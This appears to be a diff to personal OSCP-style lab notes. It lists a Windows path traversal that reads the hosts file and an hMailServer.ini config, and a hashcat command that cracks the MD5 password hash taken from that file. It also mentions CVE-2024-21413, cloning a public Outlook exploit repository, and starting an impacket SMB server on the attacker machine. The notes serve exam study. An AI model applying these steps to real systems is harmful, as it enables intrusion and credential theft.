@@ -40,7 +40,11 @@ OSCP Like
 1. Windows relative path traverse: "..\..\Windows\System32\drivers\etc\hosts" (not like linux: ../../etc/hosts)
 2. google service config path: ..\..\..\Program+Files+(x86)\hMailServer\Bin\hMailServer.ini. download it
 3. cmd: hashcat -m 0 ./md5-hash.txt /usr/share/wordlists/rockyou.txt (md5-hash.txt contains one line of the hashed pass found in .ini file)
-4. 
+4. a Google search for recent vulnerabilities related to Windows Mail -> CVE-2024-21413
+5. git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
+6. start smb server on attacker machine: $ impacket-smbserver smbFolder $(pwd) -smb2support
+7. TCP port 587 is the default port for sending outgoing emails using the Simple Mail Transfer Protocol (SMTP)
+8. 
 
 
 
